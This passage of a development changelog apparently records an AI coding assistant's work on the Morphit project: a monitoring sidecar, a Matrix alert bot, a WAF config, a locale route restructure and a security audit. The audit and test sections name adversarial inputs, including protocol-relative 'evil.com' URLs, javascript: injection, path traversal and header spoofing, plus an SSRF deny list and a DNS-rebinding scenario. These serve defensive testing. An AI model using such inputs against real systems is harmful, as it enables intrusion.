| Memory used % | >70 | >85 | >95 |
| Swap used % | >25 | >50 | >75 |
| Swap thrashing pages/sec | — | >100 | >1000 |
| CPU loadavg/cores | >1.5x | >3x | >5x |

**Bot integration (1 line):**

apps/matrix-bot/src/config.ts default `MORPHIT_MATRIX_BOT_JOURNALCTL_UNITS` now includes `morphit-host-monitor.service`.  Alerts route automatically — zero further bot changes needed for the host-monitor or any future sidecar that follows the same envelope.

**Classifier rewrite (the bigger fix):**

- `StructuredAlert.kind` renamed to `.event` throughout to match real LogRecord shape.
- `parseJournalLine` updated to pull `event` from inner JSON + payload from `inner.context` (cp9 was reading top-level fields — would have returned `undefined` payload in production).
- All `CRITICAL_MATCHERS` + `WARN_MATCHERS` use real event names verified by grep across emit sites: `operator-balance:{low_balance, balance_recovered, rpc_sustained_failure, shape_error}`, `signup-ceiling:{ceiling_reached}`, `kill-switch:{kill_switch_activated, kill_switch_active_at_startup, kill_switch_deactivated}`.  Aspirational events kept for tier-routing-when-emit-lands.
- All `ALERT_COPY` templates updated to use real placeholder names (snake_case: `balance_blurt`, `threshold_blurt`, `account`, `role`, `consecutive_failures`, `last_error`, `ceiling`, `reached_at`, `resets_at`, `path`).
- `substitute()` now returns `<unknown>` for missing keys (was returning literal `{key}` text).
- `digest.ts` uses `e.event` (was `e.kind`).
- classifier-smoke fully rewritten with REAL event names + 14 host-resource scenarios.

**14 new ALERT_COPY entries** for `host-resource:*` events with ELI5 advice:

- `disk_critical` → "free space NOW: `sudo journalctl --vacuum-time=7d`, `sudo apt clean`, prune old releases"
- `mem_critical` → "the OOM killer will start killing processes soon — check `ps aux --sort=-%mem | head -10`"
- `swap_thrashing_critical` → "the system is spending most of its time moving memory between RAM and swap — kill the largest memory consumer"
- (11 more covering disk/mem/swap/cpu at WARN+INFO and swap_thrashing at WARN)

**5 P121-CP10 persona sentinels** pinning every cp10 invariant.

**Docs (cross-doc grep up front per cp8 discipline):**

- OPERATIONS.md §16 "Host-resource monitoring sidecar" — full threshold table + setup procedure + env-tuning ini + extension pattern.
- RUN-A-MORPHIT-NODE.md §11 "Host-resource monitoring" subsection between Matrix alerting and Docker.
- MORPHIT-BRAG-LIST entry #259; closing count 258 → 259.

### Verification

- Triple-pulse: 2,551 × 3, 0 failures.  cp9 baseline 2,527 → cp10 baseline 2,551 (+24).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- Bash script live-tested with mocked systemd-cat: valid parseable JSON in correct envelope shape.

### Pending — NOT cp10 SCOPE

- Ansible playbook update with roles/host_monitor/ (still pending from cp8/cp9).
- Extended monitoring targets (smartctl, fail2ban metrics, mdadm RAID) — same sidecar pattern, separate scripts.
- Optional tighter-cadence timer (1min instead of 5min) for heavy-hardware operators.
- npm install in matrix-bot workspace still pending for matrix-bot-sdk + better-sqlite3.

---

## Part 121 cp9 — what's shipped (Matrix-bot sidecar + operator alerts + user→operator contact surfaces END-TO-END)

### Pretext

cp8 sealed the §37 hardening doc patch + BunkerWeb bundling.  cp9 is the operator-alerts-via-Matrix work Ken asked for: a Matrix bot that tails journalctl, classifies alerts into tiers, DMs operator MXID privately; plus a separate public-room surface for user→operator contact rendered on /support, /about-this-instance, and footer.  Three explicit constraints: vacation coverage (multiple recipient MXIDs), both addresses operator-editable in wizard with examples, bot OPT-IN by default (no resource consumption when Matrix unused).

Memory's @user:server vs #room:server rule informed the entire design.  Blanket @→# replacement is actively harmful — security alerts in a public room is a privacy violation.  cp9 enforces the split at five separate layers (compile-time via branded types, config-load time via parser validation, API shape via /v1/instance never carrying MXID-shaped fields, sender signature via MatrixMxid-only sendDm, persona-sentinel + adversarial-smoke verification on every CI run).

### What shipped

**NEW apps/matrix-bot/ workspace (~1100 LOC):**

8 src/ files (classifier, config, state, rateLimit, matrix, journalctl, digest, main) + 3 scripts/ smoke tests + package.json registered in root workspaces + tsconfig.

Three-tier classification, locked in by the classifier-smoke pinning policy:

- **CRITICAL** (immediate, no rate limit, every recipient): tamper events (bundle/pubkey/payload mismatch), kill-switch fired, sustained RPC failure on indexer or witness-fee poller, daily signup ceiling hit, INVALID_FEE_METHOD attempt (Memory #23 USDT-as-listing-fee block), backup FAILED, AIDE INTEGRITY_VIOLATION, operator-balance at or below zero BLURT.
- **WARN** (1/hour per category, every recipient): operator-balance LOW_BALANCE above zero, witness fee CHANGED, price-feed STALE, signup-anomaly SINGLE_IP_SPIKE, federation peer down >24h, sequential signup PATTERN_DETECTED.
- **INFO** (daily 09:00 UTC digest, skipped on quiet days): operator-balance RECOVERED, backup SUCCEEDED, federation peer DISCOVERED, anything not matched by CRITICAL or WARN matchers (safe default).

**renderAlertBody REWRITTEN with friendly per-(module, kind) copy:**

ALERT_COPY table (19 entries covering all known alert kinds) with `{title, advice}` shape.  Advice is ELI5 with `{placeholder}` substitution from payload — e.g. "@{account} ({role}) is at {current_blurt} BLURT, below your alert threshold of {threshold_blurt}.  Top up before it hits zero."  Colored HTML via Matrix-supported `<font color>` tags: red (#dc2626) for CRITICAL, amber (#d97706) for WARN, gray (#6b7280) for INFO.  Plain-text fallback retains all info for clients without HTML support.  HTML-escaping for user-provided payload values.

**SSoT in @morphit/operator-config:**

packages/operator-config/src/matrixAddress.ts — parseMxid + parseRoomAlias with branded MatrixMxid + MatrixRoomAlias types (TypeScript refuses cross-passing without explicit cast).  Rejects lookalike sigils, length-bounds at 512 chars.  Re-exported from package index.  Matrix env vars added to ALLOWLIST.

**Bot is OPT-IN BY DEFAULT (three coordinated changes):**

(1) main.ts opt-in gate exits 0 cleanly if MORPHIT_MATRIX_BOT_ALERT_MXID is unset.
(2) systemd EnvironmentFile=- (dash) makes /etc/morphit/matrix-bot.env optional.
(3) systemd Restart=on-failure (not always) — so clean exit 0 doesn't restart-loop.

Per Ken's constraint: "if the instance admin does not use matrix at all, no need to consume system resources."

**ops-cli wizard:**

stepMatrixSurfaces step (TOTAL_STEPS 16→17).  Prompts for admin MXID + group room with examples shown.  Defense-in-depth @-in-room and #-in-MXID rejections with privacy guidance in error.  Emits MORPHIT_MATRIX_BOT_ALERT_MXID + MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM in morphit.config.env.

**Indexer + indexer-client + frontend:**

/v1/instance exposes operator_matrix_room: string | null (PUBLIC).  NEVER carries an MXID.  Three frontend surfaces shipped: /support page Matrix-contact card with matrix.to deep link, /about-this-instance row, footer link.  10-locale parity for 60 new strings.

**Systemd unit:**

ops/systemd/morphit-matrix-bot.service — hardened (ProtectSystem=strict, NoNewPrivileges, etc.) + opt-in plumbing + systemd-journal group membership documented for journalctl read access.

**Smokes:**

- classifier-smoke (22 scenarios pinning tier policy)
- rate-limiter-smoke (6 scenarios with in-memory state mock)
- surface-invariant-smoke (14 adversarial scenarios enforcing @↔# split at every code boundary — parser, config, API shape, sender signature, main-loop code path)
- init-smoke fixture updated + 4 new Matrix-emission scenarios
- 8 P121-CP9 persona sentinels added

**Docs (cross-doc grep done up front per cp8 corrective discipline):**

- OPERATIONS.md §16 "Canonical Matrix routing — apps/matrix-bot" — full setup + tier policy + vacation coverage + dry-run testing + separated-surfaces invariant explanation.
- RUN-A-MORPHIT-NODE.md §11 "Matrix alerting — recommended bot sidecar" between BunkerWeb and Docker.
- MORPHIT-BRAG-LIST.md entry #258 + closing summary 257 → 258 + smoke-suite claim "2,320+" → "2,500+".

### Verification

- Triple-pulse smoke: 2,527 × 3, 0 failures.  cp8 baseline 2,470 → cp9 baseline 2,527 (+57 net).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- Adversarial surface-invariant smoke: 14/14 green.

### Pending — NOT cp9 SCOPE

- **Hardware-resource alerts** (disk full, CPU saturated, OOM-killed, low memory) NOT included.  Bot tails morphit-indexer + morphit-relay journals only.  To add: external monitoring sidecar emitting structured JSON via systemd-cat (cleanest) OR extend bot with /proc + statfs polling (worse).  cp10+ work.
- **Ansible playbook update** with roles/matrix_bot/ + ops/bunkerweb/ cleanup (separate deliverable).
- **npm install** in matrix-bot workspace to pull matrix-bot-sdk + better-sqlite3.  Classifier + rate-limiter + surface-invariant smokes run pure-TS today.

---

## Part 121 cp8 — what's shipped (§37 hardening doc patch + BunkerWeb bundled into ops/)

### Pretext

cp7 sealed the per-locale prerendering route restructure end-to-end.  cp8 is the doc-and-config follow-on after a brief detour through a sysadmin handoff document + Ansible playbook (both delivered as separate tarballs outside the cp delta stream): `morphit-sysadmin-handoff.txt` (407 lines, standalone briefing) and `morphit-ansible.tar.gz` (37 files, 24 KB, complete role-based playbook automating §37 + §34 + §35 + §31 + §32 + §38.7 + morphit services).  Ken then asked the publication-safety question about the sysadmin handoff doc; I assessed most of its content duplicated §37.18 (the already-published attack-vs-defense table) so we folded the genuinely-new content (Before-You-Start gotchas + Suggested apply order + Verification checklist) into OPERATIONS.md §37 itself instead.  Then he asked "is it possible to bundle the free version of bunkerweb with morphit?"; I recommended shipping a tested CONFIG at `ops/bunkerweb/` paralleling existing `ops/nginx/` etc., plus reframing BunkerWeb from "optional" to "recommended" in the operator-facing docs.  Both shipped in this checkpoint.

### The cp8 discipline callout

cp8's value isn't just what shipped — it's the process correction Ken forced.  When I executed the §37 patch I treated it as a localized OPERATIONS.md edit and didn't run the cross-doc grep.  Memory explicitly says "OPERATIONS.md and RUN-A-MORPHIT-NODE.md always updated together for operator-facing changes."  I had the memory in context.  I edited OPERATIONS.md without checking RUN-A-MORPHIT-NODE.md, producing a stale "17-subsection" claim that Ken caught with a pointed callout.  The corrective committed to going forward: BEFORE editing any operator-facing doc, grep across `docs/*.md` + `MORPHIT-BRAG-LIST.md` + ADRs to identify ALL sync targets, then make edits in one pass.  The BunkerWeb bundling work that followed in this checkpoint executed that pattern from the start — three sync targets identified up front (OPERATIONS.md, RUN-A-MORPHIT-NODE.md, MORPHIT-BRAG-LIST.md), one ToC anchor drift caught and fixed, all in one pass.

### What shipped

**§37 patch in OPERATIONS.md:**

- New "Before you start — the three highest-stakes gotchas" subsection between the existing §37 intro and §37.1: SSH lockout warning (second-session rule), BunkerWeb trusted-proxy CIDR width-asymmetry (too narrow / too wide both bad), Postgres listen_addresses check (verify not changed by Docker).
- New "Suggested apply order" sentence pointing through §37.1 → §37.17 → §34 → §35 → §32 → §38 → §37.18, plus triage advice for partially-hardened existing deployments.
- New §37.19 "Verification checklist — prove each defense actually fires" with concrete commands grouped by area: SSH posture, network surface (`nmap`, `psql -h <public-ip>`), the X-Forwarded-For spoof test for the trusted-proxy CIDR gotcha, secrets file perms, service state (auditd/fail2ban/morphit-*/certbot/aide/ufw), squatter defense env loaded check (10 specific MORPHIT_RELAY_* lines), backup off-host + age decryption spot-test, application surface (`/v1/instance` + `/v1/relay/health`).

**RUN-A-MORPHIT-NODE.md §11 sync:**

- Line 1500 paragraph: "17-subsection hardening checklist" → "19-subsection hardening checklist" with appended one-sentence summaries of §37.18 (attack-vs-defense map) and §37.19 (verification commands).
- §11 BunkerWeb subsection rewritten as "BunkerWeb — recommended WAF (canonical config shipped)" pointing at `ops/bunkerweb/README.md` Quick Start.

**ops/bunkerweb/ NEW directory** paralleling existing `ops/nginx/`, `ops/systemd/`, `ops/postgres/`, `ops/backup/`:

- `ops/bunkerweb/README.md` (~150 lines): turnkey deployment instructions, license note (BunkerWeb is AGPL-3.0 same as Morphit; we ship config not code), Quick Start, why morphit-services aren't in the same compose (canonical bare-metal systemd per §33), trusted-proxy CIDR explanation with asymmetric-footgun framing, version-pinning + drift warning (BunkerWeb env-vars change between major versions), customization expected per-deployment, note about Ansible playbook deploying this verbatim.
- `ops/bunkerweb/docker-compose.yml`: pinned `bunkerity/bunkerweb:1.5.10` + `bunkerity/bunkerweb-scheduler:1.5.10`, host-resident relay/indexer via `host.docker.internal:host-gateway`, Let's Encrypt mount, fixed `172.20.0.0/16` Docker network CIDR so MORPHIT_RELAY_TRUSTED_PROXY_IPS can be hard-coded.
- `ops/bunkerweb/bunkerweb.env.example`: OWASP CRS paranoia 3, anti-`Referer: none` rule on `/v1/relay/account/invite`, ASN block stubs for DigitalOcean/Hetzner/OVH (commented in ready to activate), country block empty by default, real-IP forwarding wired, CAPTCHA antibot on invite endpoint, rate limit 60r/m on /v1/.

**OPERATIONS.md §32 promoted from optional to recommended:**

- §32 heading renamed: "BunkerWeb — optional WAF..." → "BunkerWeb — recommended WAF..."
- Opening paragraph rewritten to lead with the recommendation + point at `ops/bunkerweb/` shipping pattern.
- New "Skip BunkerWeb only if:" subsection (small private instance, Tor-only, resource-constrained).
- ToC anchor at line 74 updated to match the renamed heading (catches the silent breakage).

**MORPHIT-BRAG-LIST.md entry #221 rewritten:**

- Old: "BunkerWeb compatibility audit and WAF tuning advice."
- New: "Turnkey BunkerWeb deployment in the box." (Morphit-shipped artifact, not third-party-Morphit-integrates-with framing).

### Files modified (8)

```
NEW:
  ops/bunkerweb/README.md
  ops/bunkerweb/docker-compose.yml
  ops/bunkerweb/bunkerweb.env.example

EDITED:
  docs/OPERATIONS.md            (§37 + §37.19 NEW + §32 reframe + ToC anchor)
  docs/RUN-A-MORPHIT-NODE.md    (§11 line 1500 + §11 BunkerWeb subsection)
  MORPHIT-BRAG-LIST.md          (entry #221)
  docs/REVISIT-LIST.md          (cp8 maintained-line)
  docs/AUDIT-2026-05.md         (cp8 entry)
  TARBALL.md                    (this entry)
```

### Verification

- Triple-pulse `bash scripts/run-smokes.sh`: 2,470 × 3, 0 failures (no smoke count change — doc-only + new ops/bunkerweb/ don't add code paths).
- Cross-doc grep after edits: zero stale "optional WAF" hits for BunkerWeb in OPERATIONS.md or RUN-A-MORPHIT-NODE.md.  The remaining "optional but encouraged" hit is the RUN-A-MORPHIT-NODE.md §11 chapter heading — intentionally preserved because §11 is the broader hardening menu, not BunkerWeb-specific.
- All cp7 invariants preserved.

### Ansible-playbook cleanup note (for future regeneration)

The Ansible playbook (`morphit-ansible.tar.gz`, separate deliverable) currently has BunkerWeb templates inline in `roles/bunkerweb/templates/`.  Now that `ops/bunkerweb/` exists in the morphit repo, the playbook's bunkerweb role should be updated to copy from `{{ morphit_repo_path }}/ops/bunkerweb/` rather than maintain duplicate templates — the same DRY pattern the playbook already uses for `ops/systemd/*.service`.  Logged here + in AUDIT cp8 entry + REVISIT maintained-line so it's not lost.

### Pending — explicitly NOT cp8 scope, designed in this turn for cp9

Matrix bot + operator alerts via Matrix DM (Surface B / @user:server private E2E) + user→operator contact via Matrix public room (Surface A / #room:server) with frontend surfaces on /support + /about-this-instance + footer link.  Alert tiering (CRITICAL no-rate-limit, WARN 1/hour per category, INFO daily-digest 09:00 UTC).  Persona sentinels protecting against `@↔#` replacement footgun.  10-locale parity for ~6 new strings.  New Ansible role.  Detailed design in the conversation; ~5-8 turns of work.

---

## Part 121 cp7 — what's shipped (per-locale prerendering route restructure END-TO-END + scoped deep-deep)

### Pretext

cp6 sealed with two items unblocked: (1) the per-locale prerendering route restructure was deferred to a working-build environment, (2) Ken asked whether to do a repo-wide deep-deep audit and accepted the recommendation to do the route restructure first + a scoped audit instead.  cp7 executed both.  Sandbox-bound for the duration; the cp6 Vite-bundle-builds-but-SvelteKit-prerender-fails state was actually addressable in-sandbox because the prerender failures were exactly what the restructure fixes (svelte-i18n SSR locale on /support; handleUnseenRoutes for 7 dynamic-param routes).

### Per-locale prerendering route restructure — SHIPPED END-TO-END

**File moves (24 route subdirs):** all of `[x+40][account=account]`, about-this-instance, backup-keys, chat, cheat-sheet, compare, dev, download, explorer, faq, glossary, instances, login, my, onboarding, operators, orderbook, plan, post, privacy-terms, run-a-node, scan-login, security, settings, support — moved from `apps/web/src/routes/` to `apps/web/src/routes/[lang]/`.  Plus the existing `+layout.{svelte,ts}` and `+page.svelte`.

**New files:**
- `apps/web/src/routes/+page.svelte` — detection-redirect shell using `pickLocaleFromAcceptLanguages(navigator.languages)` from cp6's path.ts + `window.location.replace(localePath(...))`.  Minimal "Loading…" placeholder content (svelte-i18n NOT loaded — keeps the shell tiny).  `<noscript>` meta-refresh fallback to /en for JS-disabled clients.  `meta robots noindex` so the bare / doesn't compete with `/en/`, `/de/`, etc. in search rankings.
- `apps/web/src/routes/+layout.ts` — `prerender = true`, `ssr = false`, `trailingSlash = 'never'`.  Redirect shell is pure client-side JS, no SSR locale guess.
- `apps/web/src/routes/+layout.svelte` — minimal wrapper (snippet pattern: `let { children }: Props = $props(); {@render children()}`).  Imports `../app.css` for base typography.  NO nav, NO banners, NO i18n — those live under [lang]/.
- `apps/web/src/routes/[lang]/+layout.ts` — `prerender = true`, `ssr = true`, `trailingSlash = 'never'`, `load({params})` validates `params.lang` against SUPPORTED_LOCALES (throws error(404) on unknown), calls `initI18nFor(code)` + `await waitLocale(code)`, returns `{ lang: code }`.
- `apps/web/src/routes/[lang]/+page.ts` — `entries()` returning `SUPPORTED_LOCALES.map((l) => ({ lang: l.code }))`.  Lives on +page.ts not +layout.ts per SvelteKit constraint ("Invalid export 'entries' in src/routes/[lang]/+layout.ts ('entries' is a valid export in +page.ts, +page.server.ts or +server.ts)").  10 locale-root entries; deep pages discovered by crawler.

**Configuration:**
- `apps/web/svelte.config.js` — added `prerender.handleUnseenRoutes: 'ignore'` so the 7 dynamic-param routes (chat/[peer=account], explorer/account/[name=account], explorer/block/[num=blocknum], explorer/tx/[id=trxid], post/edit/[permlink], [x+40][account=account], [x+40][account=account]/[permlink=permlink]) are served at runtime via the SPA fallback (`fallback: 'index.html'`) rather than failing the build.

**Build-blocker fix in Head.svelte:** added `import { building } from '$app/environment'`; gated `$page.url.search` + `$page.url.hash` reads in the onionLocation $derived behind `building ? '' : $page.url.search` (SvelteKit forbids reading url.search/hash during prerender; an empty string is the right default for static HTML since query/hash are runtime values).  Static prerendered HTML correctly carries path-only onion mirror; client-side re-render after hydration picks up real search/hash.

**Link sweep — 88 sites wrapped in `localePath()`:** bulk python-regex sweep across (a) [lang]/+layout.svelte primary nav + mobile nav (manually-targeted after the regex missed them because they're in a navLinks data array, not literal href= attributes) — fixed via wrapping `lp('/orderbook')` etc. in the array itself; (b) 55 link sites across 21 page files (orderbook, faq, post, my/orders, operators, chat, settings, about-this-instance, run-a-node, support, login, onboarding, [x+40][account=account], download, backup-keys, explorer/{,activity,account,block,tx}); (c) 20 link sites across 10 components (FaqSearch, AvatarMenu, ChatMessage, FirstPostStarterPack, FirstTradeHelper, LoginQrInitiator, MyBalanceCard, SeedBackupNudge, Term, WelcomeFirstBuyHero).  Static files (`/canary.txt`, `/pgp_keys.asc`, `/rss/orderbook.xml`, `/fonts/*`) intentionally left bare — they're served from `static/`, not locale-prefixed routes.  Each touched file got: `import { localePath } from '$i18n/path'` + `import { DEFAULT_LOCALE, type LocaleCode } from '$i18n/locales'` + `const currentLang = $derived(($page.data?.lang ?? DEFAULT_LOCALE) as LocaleCode); const lp = $derived((path: string) => localePath(path, currentLang));`.

**LanguageSwitcher rewired:** `choose(code)` now does `goto(localePath(stripLocalePrefix($page.url.pathname + search + hash), code))` instead of pure setLocale runtime swap.  Each locale has its own prerendered HTML so switching is a navigation; setLocale() is still called so the localStorage preference updates for next visit's redirect-shell detection on the bare /.

**FaqSearch LocaleCode dedupe:** my python script blindly added `import { ..., type LocaleCode } from '$i18n/locales'` to a file that already imported LocaleCode from `$i18n`.  Resolved by removing LocaleCode from the new `$i18n/locales` import line, keeping it from `$i18n` (which re-exports from `./locales` anyway since cp6).

**P121-CP7 persona-walkthrough sentinels (6 new):**
- CP7-1: [lang]/+layout.ts has prerender=true, ssr=true, initI18nFor, waitLocale, error(404)
- CP7-2: [lang]/+page.ts has entries() returning SUPPORTED_LOCALES.map (the SvelteKit "entries must live on +page" invariant)
- CP7-3: root +page.svelte has pickLocaleFromAcceptLanguages + navigator.languages + window.location.replace + noscript meta-refresh
- CP7-4: svelte.config.js has handleUnseenRoutes:'ignore'
- CP7-5: Head.svelte imports building flag and gates url.search/url.hash behind it
- CP7-6: LanguageSwitcher uses localePath + stripLocalePrefix + goto(target)

**Smoke script updates (11 files):** All hardcoded `apps/web/src/routes/<route>/+page.svelte` references updated to `apps/web/src/routes/[lang]/<route>/+page.svelte` via bulk python sweep.  Plus the relative-form `'src/routes/<route>/...'` and `'routes/<route>/...'` (path.join form) variants.  Plus the root-layout reference (`'apps/web/src/routes/+layout.svelte'` is now the redirect shell; the cp6-functionality layout is at `[lang]/+layout.svelte`).  Files updated: persona-walkthrough, price-model-picker-parity, paired-readonly-affordance-surfaces, href-xss, active-owner-key-invariants, a11y-patterns, sally-walkthrough, identity-label-policy, fee-status-label-coverage, onboarding-back-button, heading-hierarchy, voucher-locale-parity, i18n-raw-exception, split-on-placeholder + usdt-network-picker-required (in packages/asset-registry/scripts/).

**href-xss-smoke updated:** added `lp` and `localePath` to SAFE_BUILDER_NAMES (path arguments are literals authored at call sites; localePath itself returns `/lang/...` form, never reflecting attacker-controlled values).  ALLOWLIST_HREF_EXPR entry for [lang]/+layout.svelte → `link.href` (the navLinks array's href field is constructed via lp() at array-build time; the template reading `link.href` can't be traced back to lp() by the smoke's call-detection regex).

### Scoped deep-deep — Items #2 + #3 (audit findings)

**#2 federation-probe surface (apps/indexer/src/indexer/federationProbe.ts, 616 LOC):** Well-hardened.  Defense-in-depth at registration time (operatorRegister.ts) + at fetch time (federationProbe.ts).  HTTPS-only, comprehensive private-network deny list (RFC 1918, link-local 169.254/16, loopback, IPv6 unique-local fc00::/7, IPv6 link-local fe80::/10, cloud metadata 169.254.169.254 + metadata.google.internal, .local/.localhost/.internal TLDs).  `redirect: 'manual'` prevents redirect-based bypass.  256KB response cap with Content-Length pre-check AND streaming-with-abort fallback.  AbortController timeout.  Identifying user-agent.  **One known gap:** DNS rebinding — attacker registers `evil.example.com` resolving to public IP at registration, controls DNS to flip to internal IP at probe time.  Damage bound by existing defense-in-depth (information disclosure / DoS only — no exfiltration, no RCE, GET-only, 256KB cap).  Inline comment at operatorRegister.ts:223 already acknowledges the gap.  **New REVISIT §A entry filed** elevating that comment to tracked work (complete fix: DNS resolve + per-A/AAAA IP-class validation + connect to resolved IP via custom undici Dispatcher; ~half-day work + smoke coverage).

**#2 SQL/DB layer (apps/indexer/src/db/schema.sql, 2,135 LOC, 33 tables):** All 33 tables have PK or UNIQUE constraint coverage (verified by python regex over the CREATE TABLE blocks).  45 CHECK constraints (state-enum enforcement: orders.status, orders.side, feedback.rating, fee_method, fee_status, accounts.kind, suspicious_reciprocity.account_a/b ordering, etc.).  212 NOT NULL columns.  36 DEFAULT clauses.  Identifier interpolation in template-literal queries (SAVEPOINT ${name}, ROLLBACK TO SAVEPOINT ${name}) is either hardcoded const strings (feedback.ts: 'welcome_bonus_sp', loyalty.ts: 'first_fee_welcome_sp') or integer-validated values (dispatcher.ts: Number.isInteger check before constructing 'op_${trxInBlock}_${opInTrx}').  No SQL injection vectors via string concat.  fee_method CHECK constraint = ('blurt', 'waived_first_buy', 'btc', 'xmr') — correctly excludes USDT per Memory #23 (DB-level enforcement of trade-only USDT confirmed).  FK count is sparse (6 references across 33 tables) — intentional pattern: rows are chain-derived materializations, FK against chain-derived state would risk rejecting valid chain history if rows arrive out of order or an indexer skipped a block.  Validation happens at handler time, not via FK.

**#2 HTTP/API surface (apps/indexer/src/api/*.ts, 38 endpoints, 6,188 LOC + apps/relay/src/api/*.ts, 4 POST endpoints):**  Indexer: complex multi-param shapes (orderbook with 8 params + cursor; conversations; chatStream) use zod `safeParse`.  Simple single-param endpoints use targeted predicates (`isAccountName(account)` + explicit enum equality for `phase`).  Equivalent safety, idiomatic Hono pattern.  Relay: all 4 POST endpoints use `requestSchema.safeParse(body)` (availability.ts, create.ts, invite.ts) — zod-validated.  Health.ts has no body.  8 policy modules totaling ~2,000 LOC for layered defenses: ALTCHA proof-of-work, clock skew check, global daily ceiling (TOCTOU-aware: reservedCount + count to bound concurrent overshoot to N-1), high-value-name reservation, invite tokens, kill-switch (shipped in earlier part per memory), name validation, sequential-account detector.  CORS exact-match origin allowlist (no wildcards).  Security middleware: X-Content-Type-Options nosniff, Referrer-Policy no-referrer, X-Frame-Options DENY, Permissions-Policy interest-cohort=().  Body size cap with Transfer-Encoding chunked rejection on POST/PUT/PATCH (411).  No findings.

**#2 Operator-trust threat model (docs/OPERATOR-TRUST-DESIGN.md + frontend banners):** Three-tier model (selfish / censoring / lying) fully addressed.  Tier 1 (selfish operator using BLURT fees instead of treasury split): on-chain fee-method enum is observable.  Tier 2 (censoring operator hiding orders): federation surfaces peer-instance orders read-only; users can self-route via /about-this-instance (cp6 work).  Tier 3 (lying operator serving tampered HTML/JS): TamperAlertBanner verifies bundle bytes against chain-signed manifest with non-dismissible red banner on mismatch; pubkey_mismatch and invalid_payload cases also covered.  StaleBuildBanner warns on stale bundles.  UpdateBanner surfaces voluntary updates.  Operator registration (ADR-0013, shipped 2026-05-02) puts operator account/origin on-chain.  Chat E2EE invariant explicit in handler (chat.ts:23-24): "decrypting would be both useless (it's encrypted) and a privacy violation of the E2EE guarantee" — pattern is intentional and enforced.  No findings.

**#3 cp6 self-audit:** (a) i18n module refactor — `locales.ts` zero imports verified (pure SSoT, no SvelteKit deps); 11-scenario adversarial smoke added (`apps/web/scripts/path-adversarial-smoke.ts`) covering path traversal, protocol-relative URLs, stacked locale prefix, javascript: pseudo-protocol in Accept-Language, q-value tags, whitespace-padded tags, long pref list, idempotent strip — all 11 pass.  Path traversal (`/orderbook/../faq`) produces `/es/orderbook/../faq` which SvelteKit's router normalizes at routing time (locale prefix preserved).  Protocol-relative URL (`//evil.com/path`) produces `/es//evil.com/path` — leading `/es/` prevents browser protocol-relative interpretation.  (b) disabled_assets end-to-end plumbing — env `MORPHIT_INDEXER_DISABLED_ASSETS` → zod parser → `config.disabledAssets` → order-handler reject with `'asset_disabled_on_instance'` AND /v1/instance exposure → indexer-client mirror (optional, back-compat) → frontend instance store with [] fallback → 4 render sites consume `$instance.disabled_assets`.  No type mismatches.  (c) REVISIT-LIST §A scope check — found one stale entry: "Per-locale prerendering — route-tree restructure DEFERRED 2026-05-14" replaced with ✅ SHIPPED summary listing every cp7 file change.  Federation-probe extension entry remains correctly DEFERRED (peer-instance disabled_assets badge on /operators still requires v33 migration + probe-handler extension).

**New adversarial smoke registered + sentinel coverage extended:** path-adversarial-smoke registered in scripts/run-smokes.sh.  Triple-pulse stable.

### Verification

- **`npm run build` produces 202 HTML files** (20 per locale × 10 locales = 200, plus index.html redirect shell + degraded.html fallback).  Perfect symmetry across all 10 locales including RTL (fa).
- Rendered `de.html`: 0 bare `/orderbook`, `/faq`, `/chat`, `/post` paths; all nav + footer + CTAs carry `/de/` prefix.
- Same verification for `fa.html` (RTL): all 10 expected `/fa/<route>` link prefixes present.
- **Triple-pulse `bash scripts/run-smokes.sh`: 2,470 scenarios green × 3, 0 failures.**  cp6 baseline 2,449 → cp7 baseline 2,470 (+21 = 6 CP7-1..6 persona sentinels + 11 adversarial smoke + 4 from other registrations clearing up after the route-restructure path updates).
- Locale parity: 10/10 green at 2,511 keys × 10 (unchanged from cp6).
- Translation-completeness: 4/4 green.
- Key-coverage: 1,838 static + 24 dynamic resolve.
- Persona-walkthrough: 55/55 green (was 49; +6 P121-CP7 sentinels).
- svelte-check: 0 errors, 1 pre-existing warning (FundsSentModal:83, unrelated).
- Typecheck sweep: indexer (src + test), relay (src + test), ops-cli, indexer-client, operator-config, asset-registry all 0 errors.
- All cp3/cp4/cp5/cp6 invariants preserved: fee-method-enum-frozen 7/7, first-buy-waiver-payment-agnostic 6/6, usdt-trade-only 11/11, usdt-network-picker-required 9/9, disabled-assets-parse 12/12, reserved-keys-parity green, i18n-locale-parity 10/10 (svelte-check-aware), i18n-path-helpers 22/22, persona-walkthrough 55/55.

### Files modified this turn (cp7)

```
# Route restructure — file moves
apps/web/src/routes/  →  apps/web/src/routes/[lang]/  (24 subdirs + 3 files)

# Root redirect shell (NEW)
apps/web/src/routes/+page.svelte (NEW — detection redirect)
apps/web/src/routes/+layout.ts (NEW — prerender=true ssr=false)
apps/web/src/routes/+layout.svelte (NEW — minimal wrapper)

# [lang]/ subtree config (NEW)
apps/web/src/routes/[lang]/+layout.ts (NEW — prerender + ssr + load with initI18nFor)
apps/web/src/routes/[lang]/+page.ts (NEW — entries())

# Configuration
apps/web/svelte.config.js (handleUnseenRoutes:'ignore')

# Build-blocker fixes
apps/web/src/lib/components/Head.svelte (building-flag gate on url.search/hash)

# Link sweep (88 sites across 31 files)
apps/web/src/routes/[lang]/+layout.svelte (navLinks array + 13 footer/CTA sites + lp helper + imports)
apps/web/src/routes/[lang]/+page.svelte (3 sites + lp helper + imports)
apps/web/src/routes/[lang]/post/+page.svelte (1 site)
apps/web/src/routes/[lang]/explorer/{,activity,account,block,tx}/+page.svelte (5 sites)
apps/web/src/routes/[lang]/my/orders/+page.svelte (6 sites)
apps/web/src/routes/[lang]/operators/+page.svelte (3 sites)
apps/web/src/routes/[lang]/chat/+page.svelte (2 sites)
apps/web/src/routes/[lang]/settings/+page.svelte (1 site)
apps/web/src/routes/[lang]/about-this-instance/+page.svelte (2 sites)
apps/web/src/routes/[lang]/orderbook/+page.svelte (3 sites)
apps/web/src/routes/[lang]/run-a-node/+page.svelte (3 sites)
apps/web/src/routes/[lang]/support/+page.svelte (4 sites)
apps/web/src/routes/[lang]/login/+page.svelte (4 sites)
apps/web/src/routes/[lang]/onboarding/+page.svelte (1 site)
apps/web/src/routes/[lang]/onboarding/register-name/+page.svelte (1 site)
apps/web/src/routes/[lang]/[x+40][account=account]/+page.svelte (4 sites)
apps/web/src/routes/[lang]/download/+page.svelte (8 sites)
apps/web/src/routes/[lang]/backup-keys/+page.svelte (3 sites)
